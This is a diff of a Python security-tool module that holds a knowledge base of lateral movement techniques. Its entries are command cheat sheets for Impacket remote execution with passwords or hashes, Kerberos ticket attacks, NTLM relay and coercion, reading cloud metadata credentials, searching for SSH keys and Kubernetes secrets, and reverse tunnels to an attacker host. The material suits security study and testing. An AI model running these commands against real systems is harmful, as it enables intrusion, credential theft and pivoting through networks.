@@ -2,10 +2,10 @@
 
 Deep knowledge about lateral movement:
 1. Windows lateral movement
-2. Linux/Unix lateral movement
+2. Linux lateral movement
 3. Cloud lateral movement
-4. Active Directory pivoting
-5. Network pivoting and tunneling
+4. Credential relay attacks
+5. Pivoting and tunneling
 """
 
 from __future__ import annotations
@@ -19,7 +19,7 @@ logger = structlog.get_logger()
 
 
 @dataclass
-class LateralPattern:
+class LateralMovementPattern:
     """A lateral movement pattern."""
     pattern_id: str = ""
     name: str = ""
@@ -39,217 +39,208 @@ class LateralPattern:
 
 LATERAL_PATTERNS: list[dict[str, Any]] = [
     {
-        "id": "lm-001", "name": "Windows Lateral Movement",
+        "id": "lat-001", "name": "Windows Lateral Movement",
         "category": "windows", "severity": "critical",
         "desc": "Windows lateral movement techniques.",
         "detection": (
             "WINDOWS LATERAL MOVEMENT:\n"
-            "PSEXEC:\n"
-            "  # Impacket psexec\n"
-            "  psexec.py DOMAIN/user:pass@TARGET\n"
-            "  # Metasploit\n"
-            "  use exploit/windows/smb/psexec\n"
-            "  # Requires: SMB (445), admin creds\n"
-            "WMI:\n"
-            "  # wmiexec (Impacket)\n"
-            "  wmiexec.py DOMAIN/user:pass@TARGET\n"
-            "  # PowerShell\n"
-            "  Invoke-WmiMethod -ComputerName TARGET ...\n"
-            "  # Semi-interactive, no binary drop\n"
-            "WINRM:\n"
-            "  # evil-winrm\n"
-            "  evil-winrm -i TARGET -u user -p pass\n"
-            "  # Requires port 5985/5986\n"
-            "RDP:\n"
-            "  # xfreerdp\n"
-            "  xfreerdp /v:TARGET /u:user /p:pass\n"
-            "  # Restricted Admin mode (no creds on target)\n"
-            "  # SharpRDP (command execution via RDP)\n"
-            "DCOM:\n"
-            "  # dcomexec (Impacket)\n"
-            "  dcomexec.py DOMAIN/user:pass@TARGET\n"
-            "  # Uses DCOM objects (MMC20.Application)\n"
-            "SCM:\n"
-            "  # smbexec (Impacket)\n"
-            "  smbexec.py DOMAIN/user:pass@TARGET\n"
-            "  # Creates/starts service via SCM\n"
-            "PASS-THE-HASH:\n"
-            "  # Use NTLM hash instead of password\n"
-            "  psexec.py -hashes :HASH DOMAIN/user@TARGET\n"
+            "REMOTE EXECUTION:\n"
+            "  PsExec:\n"
+            "    # impacket-psexec user:pass@TARGET\n"
+            "    # Creates PSEXESVC service\n"
+            "    # Runs as SYSTEM\n"
+            "  WMI:\n"
+            "    # impacket-wmiexec user:pass@TARGET\n"
+            "    # wmic /node:TARGET process call create 'cmd'\n"
+            "    # No service creation\n"
+            "  WinRM:\n"
+            "    # evil-winrm -i TARGET -u user -p pass\n"
+            "    # PowerShell remoting\n"
+            "    # Invoke-Command -ComputerName TARGET\n"
+            "  DCOM:\n"
+            "    # impacket-dcomexec user:pass@TARGET\n"
+            "    # Multiple COM objects\n"
+            "  SMB:\n"
+            "    # impacket-smbexec user:pass@TARGET\n"
+            "    # No binary upload\n"
+            "  Scheduled Tasks:\n"
+            "    # schtasks /create /s TARGET /tn task /tr cmd\n"
+            "  MMC20.Application:\n"
+            "    # DCOM lateral via MMC\n"
+            "CREDENTIAL-BASED:\n"
+            "  - Pass-the-Hash (PtH)\n"
+            "    # impacket-psexec -hashes :NTLM user@TARGET\n"
+            "  - Pass-the-Ticket (PtT)\n"
+            "    # export KRB5CCNAME=ticket.ccache\n"
+            "  - Overpass-the-Hash\n"
+            "    # Rubeus asktgt /user:x /rc4:hash\n"
             "TOOLS:\n"
-            "  Impacket, evil-winrm, CrackMapExec"
+            "  impacket, CrackMapExec, evil-winrm, Rubeus"
         ),
-        "tools": ["crackmapexec"],
+        "tools": [],
     },
     {
-        "id": "lm-002", "name": "Linux/Unix Lateral Movement",
+        "id": "lat-002", "name": "Linux Lateral Movement",
         "category": "linux", "severity": "high",
         "desc": "Linux lateral movement techniques.",
         "detection": (
             "LINUX LATERAL MOVEMENT:\n"
             "SSH:\n"
-            "  # Key-based\n"
-            "  ssh -i stolen_key user@TARGET\n"
-            "  # Agent forwarding abuse\n"
-            "  ssh -A user@TARGET  # Forward agent\n"
-            "  # ProxyJump (multi-hop)\n"
-            "  ssh -J jump_host user@TARGET\n"
-            "  # SSH hijacking (ControlMaster)\n"
-            "  # Steal SSH agent socket\n"
-            "ANSIBLE/AUTOMATION:\n"
-            "  - Abuse Ansible playbooks\n"
-            "  - Puppet/Chef exploitation\n"
-            "  - SaltStack command injection\n"
-            "  - Jenkins agent abuse\n"
-            "NETWORK SERVICES:\n"
-            "  - NFS shares (no_root_squash)\n"
-            "  - NIS/YP exploitation\n"
-            "  - LDAP enumeration\n"
-            "  - Samba/CIFS shares\n"
-            "  - rsh/rlogin (legacy)\n"
-            "CREDENTIAL REUSE:\n"
-            "  - /etc/shadow (if readable)\n"
-            "  - .bash_history credentials\n"
-            "  - SSH keys in home dirs\n"
-            "  - Config files with passwords\n"
-            "  - Database connection strings\n"
-            "  - Environment variables\n"
-            "  - Kubernetes secrets\n"
-            "CONTAINERS:\n"
-            "  - Docker socket access\n"
-            "  - Kubernetes pod pivoting\n"
-            "  - Container escape → host\n"
+            "  - Key-based access\n"
+            "    # ssh -i key.pem user@TARGET\n"
+            "    # Find keys: find / -name 'id_rsa' 2>/dev/null\n"
+            "    # Check ~/.ssh/authorized_keys\n"
+            "    # SSH agent forwarding hijack\n"
+            "      # SSH_AUTH_SOCK in /tmp/ssh-*/agent.*\n"
+            "  - Credential reuse\n"
+            "    # Same passwords across systems\n"
+            "    # /etc/shadow cracking\n"
+            "TRUST RELATIONSHIPS:\n"
+            "  - NFS exports\n"
+            "    # showmount -e TARGET\n"
+            "    # Mount and access files\n"
+            "  - SSH keys in shared directories\n"
+            "  - .rhosts / hosts.equiv\n"
+            "  - Ansible/Chef/Puppet control\n"
+            "APPLICATIONS:\n"
+            "  - Database connections\n"
+            "    # Credential files (my.cnf, pgpass)\n"
+            "  - Web application configs\n"
+            "    # Connection strings\n"
+            "  - Container escape to host\n"
+            "    # Docker socket mount\n"
+            "    # Kubernetes service accounts\n"
+            "CRON / SYSTEMD:\n"
+            "  - Scheduled task modification\n"
+            "  - Service manipulation\n"
+            "  - Socket activation\n"
             "TOOLS:\n"
-            "  SSH, Ansible, LinPEAS"
+            "  ssh, sshpass, proxychains, chisel"
         ),
-        "tools": ["ssh"],
+        "tools": [],
     },
     {
-        "id": "lm-003", "name": "Cloud Lateral Movement",
+        "id": "lat-003", "name": "Cloud Lateral Movement",
         "category": "cloud", "severity": "critical",
-        "desc": "Cloud environment lateral movement.",
+        "desc": "Cloud lateral movement techniques.",
         "detection": (
             "CLOUD LATERAL MOVEMENT:\n"
             "AWS:\n"
-            "  - IAM role chaining\n"
+            "  - EC2 instance role abuse\n"
+            "    # Metadata: 169.254.169.254\n"
+            "    # Assume role to other services\n"
             "  - Cross-account role assumption\n"
-            "  - EC2 instance profile abuse\n"
+            "    # sts assume-role\n"
             "  - Lambda function pivoting\n"
-            "  - SSM Session Manager\n"
-            "  - S3 bucket credential harvesting\n"
-            "  - Metadata service (169.254.169.254)\n"
-            "  # IMDS v1 exploitation\n"
-            "  curl http://169.254.169.254/latest/meta-data/\n"
-            "  # Get instance role credentials\n"
-            "  curl http://169.254.169.254/latest/meta-data/iam/...\n"
+            "  - SSM session to other instances\n"
+            "    # aws ssm start-session --target ID\n"
+            "  - S3 bucket access from EC2\n"
             "AZURE:\n"
-            "  - Managed Identity token theft\n"
-            "  - Service Principal abuse\n"
-            "  - Runbook exploitation\n"
-            "  - Azure VM agent\n"
-            "  - Key Vault access chaining\n"
+            "  - Managed identity abuse\n"
+            "    # IMDS endpoint\n"
+            "    # Token for other services\n"
             "  - Subscription pivoting\n"
+            "  - Azure AD to Azure resources\n"
+            "  - Hybrid joined devices\n"
+            "  - Azure DevOps service connections\n"
             "GCP:\n"
-            "  - Service account impersonation\n"
-            "  - Metadata server abuse\n"
-            "  - Cloud Function pivoting\n"
-            "  - GKE node compromise\n"
-            "  - Project hopping\n"
+            "  - Service account key abuse\n"
+            "  - Metadata server tokens\n"
+            "  - Cross-project access\n"
+            "  - GKE to GCP services\n"
             "KUBERNETES:\n"
-            "  - Service account token abuse\n"
-            "  - RBAC privilege escalation\n"
-            "  - etcd direct access\n"
-            "  - Kubelet API abuse\n"
-            "  - Pod-to-pod pivoting\n"
+            "  - Service account token theft\n"
+            "  - Pod-to-pod communication\n"
+            "  - Node access from pod\n"
+            "  - Secret extraction\n"
+            "    # kubectl get secrets\n"
             "TOOLS:\n"
-            "  Pacu (AWS), ROADtools (Azure), ScoutSuite"
+            "  Pacu, CloudFox, ScoutSuite, kubectl"
         ),
-        "tools": ["pacu"],
+        "tools": [],
     },
     {
-        "id": "lm-004", "name": "Active Directory Pivoting",
-        "category": "ad", "severity": "critical",
-        "desc": "Active Directory pivoting techniques.",
+        "id": "lat-004", "name": "Credential Relay Attacks",
+        "category": "relay", "severity": "critical",
+        "desc": "Credential relay and coercion.",
         "detection": (
-            "ACTIVE DIRECTORY PIVOTING:\n"
-            "KERBEROS:\n"
-            "  # Kerberoasting\n"
-            "  GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP\n"
-            "  # AS-REP Roasting\n"
-            "  GetNPUsers.py DOMAIN/ -dc-ip DC_IP -no-pass\n"
-            "  # Pass-the-Ticket\n"
-            "  export KRB5CCNAME=ticket.ccache\n"
-            "  psexec.py -k DOMAIN/user@TARGET\n"
-            "  # Overpass-the-Hash\n"
-            "  getTGT.py DOMAIN/user -hashes :HASH\n"
-            "  # Golden Ticket\n"
-            "  ticketer.py -nthash KRBTGT_HASH -domain DOMAIN ...\n"
-            "  # Silver Ticket\n"
-            "  ticketer.py -nthash SVC_HASH -domain DOMAIN ...\n"
-            "ACL ABUSE:\n"
-            "  - WriteDacl → add permissions\n"
-            "  - WriteOwner → take ownership\n"
-            "  - GenericAll → full control\n"
-            "  - GenericWrite → modify attributes\n"
-            "  - ForceChangePassword\n"
-            "  - AddMember → add to group\n"
-            "DELEGATION:\n"
-            "  - Unconstrained delegation\n"
-            "  - Constrained delegation (S4U)\n"
-            "  - RBCD (Resource-Based Constrained)\n"
-            "TRUST:\n"
-            "  - Inter-domain trust abuse\n"
-            "  - Forest trust exploitation\n"
-            "  - SID History injection\n"
+            "CREDENTIAL RELAY:\n"
+            "NTLM RELAY:\n"
+            "  - Capture NTLM authentication\n"
+            "    # Responder (LLMNR/NBT-NS poison)\n"
+            "  - Relay to SMB\n"
+            "    # impacket-ntlmrelayx -tf targets.txt\n"
+            "    # --no-http-server -smb2support\n"
+            "  - Relay to LDAP/LDAPS\n"
+            "    # Modify AD objects\n"
+            "    # Add computer to domain\n"
+            "    # Configure RBCD\n"
+            "  - Relay to HTTP (ADCS)\n"
+            "    # ESC8: NTLM relay to web enrollment\n"
+            "    # Request certificate as target\n"
+            "COERCION:\n"
+            "  - PetitPotam\n"
+            "    # Force DC authentication via EFS\n"
+            "  - PrinterBug/SpoolSample\n"
+            "    # Force target to auth to us\n"
+            "  - DFSCoerce\n"
+            "    # Via DFS protocol\n"
+            "  - ShadowCoerce\n"
+            "    # Via VSS protocol\n"
+            "KERBEROS RELAY:\n"
+            "  - KrbRelayUp\n"
+            "    # Local privilege escalation\n"
+            "    # RBCD abuse\n"
+            "  - Cross-protocol relay\n"
+            "MITIGATION:\n"
+            "  - EPA (Extended Protection)\n"
+            "  - SMB signing required\n"
+            "  - LDAP signing/channel binding\n"
             "TOOLS:\n"
-            "  BloodHound, Impacket, Rubeus, PowerView"
+            "  Responder, impacket, Rubeus, Certify"
         ),
-        "tools": ["bloodhound"],
+        "tools": [],
     },
     {
-        "id": "lm-005", "name": "Network Pivoting and Tunneling",
+        "id": "lat-005", "name": "Pivoting and Tunneling",
         "category": "pivoting", "severity": "high",
-        "desc": "Network pivoting and tunneling.",
+        "desc": "Network pivoting techniques.",
         "detection": (
-            "NETWORK PIVOTING AND TUNNELING:\n"
+            "PIVOTING & TUNNELING:\n"
             "SSH TUNNELING:\n"
-            "  # Local port forward\n"
-            "  ssh -L 8080:internal:80 user@pivot\n"
-            "  # Remote port forward\n"
-            "  ssh -R 9090:localhost:80 user@pivot\n"
-            "  # Dynamic SOCKS proxy\n"
-            "  ssh -D 1080 user@pivot\n"
-            "  # ProxyChains config\n"
-            "  # socks5 127.0.0.1 1080\n"
+            "  Local port forward:\n"
+            "    # ssh -L 8080:internal:80 user@pivot\n"
+            "  Remote port forward:\n"
+            "    # ssh -R 9090:localhost:80 user@external\n"
+            "  Dynamic (SOCKS):\n"
+            "    # ssh -D 1080 user@pivot\n"
+            "    # proxychains nmap TARGET\n"
+            "  ProxyJump:\n"
+            "    # ssh -J pivot1,pivot2 target\n"
             "CHISEL:\n"
-            "  # Server\n"
-            "  ./chisel server -p 8080 --reverse\n"
-            "  # Client (reverse SOCKS)\n"
-            "  ./chisel client SERVER:8080 R:socks\n"
-            "  # Client (specific port)\n"
-            "  ./chisel client SERVER:8080 R:8443:INTERNAL:443\n"
+            "  # Server: chisel server -p 8000 --reverse\n"
+            "  # Client: chisel client SERVER:8000 R:socks\n"
+            "  # Fast HTTP tunnel, socks5\n"
             "LIGOLO-NG:\n"
-            "  # Agent on target\n"
-            "  ./agent -connect ATTACKER:11601\n"
-            "  # Proxy on attacker\n"
-            "  ./proxy -selfcert\n"
-            "  # Creates tun interface for routing\n"
-            "SOCAT:\n"
-            "  # Port relay\n"
-            "  socat TCP-LISTEN:8080,fork TCP:INTERNAL:80\n"
-            "METASPLOIT:\n"
-            "  # Auto-route through session\n"
-            "  use post/multi/manage/autoroute\n"
-            "  # SOCKS proxy\n"
-            "  use auxiliary/server/socks_proxy\n"
-            "DOUBLE PIVOTING:\n"
-            "  - Chain multiple tunnels\n"
-            "  - ProxyChains multiple hops\n"
-            "  - Meterpreter route chaining\n"
+            "  # Agent-based, no SOCKS needed\n"
+            "  # Direct network access\n"
+            "  # Multi-hop pivoting\n"
+            "OTHER:\n"
+            "  - socat relays\n"
+            "    # socat TCP-LISTEN:8080,fork TCP:TARGET:80\n"
+            "  - rpivot (reverse socks proxy)\n"
+            "  - sshuttle (VPN over SSH)\n"
+            "    # sshuttle -r user@pivot 10.0.0.0/8\n"
+            "  - Meterpreter autoroute\n"
+            "  - Cobalt Strike SOCKS\n"
+            "DOUBLE PIVOT:\n"
+            "  - Chain through multiple networks\n"
+            "  - proxychains-ng multi-hop\n"
+            "  - SSH agent forwarding chain\n"
             "TOOLS:\n"
-            "  Chisel, Ligolo-ng, SSH, socat, proxychains"
+            "  chisel, ligolo-ng, sshuttle, proxychains"
         ),
-        "tools": ["chisel"],
+        "tools": [],
     },
 ]
 
@@ -262,14 +253,14 @@ class LateralMovementKB:
     """
 
     def __init__(self) -> None:
-        self._patterns: dict[str, LateralPattern] = {}
+        self._patterns: dict[str, LateralMovementPattern] = {}
         self._log = logger.bind(component="lateral_kb")
         self._load_patterns()
 
     def _load_patterns(self) -> None:
         """Load lateral movement patterns."""
         for data in LATERAL_PATTERNS:
-            pattern = LateralPattern(
+            pattern = LateralMovementPattern(
                 pattern_id=data["id"],
                 name=data["name"],
                 category=data.get("category", ""),
@@ -280,7 +271,7 @@ class LateralMovementKB:
             )
             self._patterns[pattern.pattern_id] = pattern
 
-    def get_by_category(self, category: str) -> list[LateralPattern]:
+    def get_by_category(self, category: str) -> list[LateralMovementPattern]:
         """Get patterns by category."""
         return [
             p for p in self._patterns.values()
